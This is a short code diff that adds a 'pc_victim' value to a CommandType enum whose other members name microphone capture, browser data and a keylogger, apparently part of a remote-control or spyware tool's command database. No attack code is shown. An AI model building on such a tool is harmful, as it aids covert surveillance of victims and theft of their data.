@@ -9,6 +9,7 @@ class CommandType(Enum):
     MICROPHONE = "microphone"
     BROWSER_DATA = "browser_data"
     KEYLOGGER = "keylogger"
+    PC_VICTIM = "pc_victim"
 
 
 class Command(db.Model):
